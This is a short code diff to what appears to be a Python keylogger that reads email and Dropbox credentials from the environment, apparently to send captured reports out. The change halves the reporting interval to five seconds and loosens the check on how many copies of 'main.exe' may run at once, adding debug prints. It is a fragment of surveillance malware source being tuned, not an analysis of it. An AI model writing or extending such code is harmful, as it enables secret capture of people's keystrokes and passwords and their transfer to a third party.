@@ -14,7 +14,7 @@ EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
 EMAIL_CC = os.getenv("EMAIL_CC")
 DROPBOX_TOKEN = os.getenv("DROPBOX_TOKEN")
 
-SEND_REPORT_EVERY = 10  # seconds
+SEND_REPORT_EVERY = 5  # seconds
 MAGIC_WORD = "stop"
 
 SRC_FILE = "D:\main.exe"
@@ -31,7 +31,11 @@ def is_process_running(process_name):
 
 
 def main():
-    if is_process_running("main.exe") >= 2:
+    running_instances = is_process_running("main.exe")
+    print(f"Number of 'main.exe' ongoing processes: {running_instances}")
+
+    if running_instances >= 4:
+        print("Too many ongoing processes. Exiting.")
         return
 
     keylogger = KeyLogger(
